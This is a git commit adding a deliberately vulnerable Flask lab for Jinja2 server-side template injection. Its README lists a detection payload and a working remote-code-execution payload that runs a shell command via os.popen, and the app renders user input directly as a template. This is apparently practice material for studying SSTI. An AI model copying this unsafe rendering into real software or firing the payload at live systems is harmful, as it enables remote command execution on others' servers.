fb03df004a0039af03eb163f2d9abb6ac53a13f2
ricoandreaslepp <ricoandreaslepp@gmail.com>
2023-01-13 00:40:03 +0200

    jinja working, but poor

---
+++ SSTI/README.md
@@ -0,0 +1,17 @@
+# Jinja2 SSTI
+
+name parameter is vulnerable to SSTI.
+
+# Payloads
+for detection
+```
+{{7*7}}
+```
+
+for RCE
+```
+{{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}
+```
+
+# Credit
+Idea from https://gusralph.info/jinja2-ssti-research/
--- SSTI/flask_jinja.py
+++ SSTI/flask_jinja.py
@@ -1,10 +1,13 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
 @app.route("/")
 def home():
-    return "hello!"
+    if request.args.get('name'):
+        return render_template_string(request.args.get('name'))
+    
+    return "Hello, send us your name!"
 
 if __name__ == "__main__":
     app.run(debug=True)
